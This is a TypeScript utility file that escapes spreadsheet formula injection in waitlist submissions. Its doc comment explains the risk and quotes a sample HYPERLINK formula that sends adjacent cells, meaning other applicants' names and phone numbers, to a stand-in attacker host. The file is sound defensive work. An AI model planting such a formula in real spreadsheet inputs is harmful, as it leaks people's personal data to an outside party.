/**
 * Neutralises spreadsheet formula injection in outbound submission payloads.
 *
 * ## Why this exists
 *
 * A field beginning `=`, `+`, `@` or `-` is a formula in Excel, Google Sheets and
 * LibreOffice. The waitlist destination is a spreadsheet a founder reads by hand,
 * so the attack does not land on a server — it lands on the person doing the
 * review, who is the only intake control the beta has.
 *
 * The sharpest payload is not the one that looks dangerous:
 *
 *     =HYPERLINK("https://evil.example/?x="&A1&A2,"Click to verify")
 *
 * That renders as ordinary link text. Clicking it sends the adjacent cells —
 * other applicants' names and phone numbers — to an attacker's URL. Confirmed
 * reaching the destination unescaped during security audit 01 (F-01).
 *
 * ## Why at the delivery boundary, and not at input validation
 *
 * The stored value stays exactly what the seller typed. Somebody selling
 * "-40% clearance stock" has a legitimate leading `-`, and mangling it in the
 * record to protect a spreadsheet would be fixing the wrong layer. Only the
 * representation crossing into a spreadsheet-shaped destination is neutralised.
 *
 * ## This is destination-specific
 *
 * Correct for a Sheet, a CSV, or anything a spreadsheet will open. **Wrong for a
 * Postgres column, a JSON store, or an API that is not a spreadsheet** — there it
 * corrupts the data for no benefit. Revisit this when the waitlist destination is
 * actually chosen (ADU-WEB-01 §14, open item: waitlist delivery destination).
 */

/** Leading characters a spreadsheet treats as the start of a formula. */
const FORMULA_LEADERS = ['=', '+', '@', '-'];

/**
 * Prefixes a leading formula character with an apostrophe, the standard
 * mitigation: spreadsheets treat the value as literal text and do not display
 * the apostrophe itself.
 *
 * Tab and carriage return are the other two documented leaders. They are already
 * handled upstream — `str()` in `./validation` calls `.trim()`, so a field can
 * never reach here with leading whitespace. **Do not remove that `.trim()` as
 * redundant; it is load-bearing for this.** Verified during audit 01: the
 * `\tTabLeading` payload arrived as `TabLeading`.
 */
/**
 * Expect this to fire on almost every `handle` field: a TikTok or Instagram
 * handle starts with `@`, which is a formula leader. That is correct, not a
 * false positive. A spreadsheet displays `'@seller` as `@seller` and does not
 * show the apostrophe — but a raw CSV export will contain it, so anyone reading
 * the file rather than the sheet should know why it is there.
 */
export function spreadsheetSafe(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_LEADERS.includes(value[0]!) ? `'${value}` : value;
}

/** Applies `spreadsheetSafe` to every string in a flat record. */
export function spreadsheetSafeRecord<T extends Record<string, string>>(record: T): T {
  return Object.fromEntries(
    Object.entries(record).map(([key, value]) => [key, spreadsheetSafe(value)])
  ) as T;
}
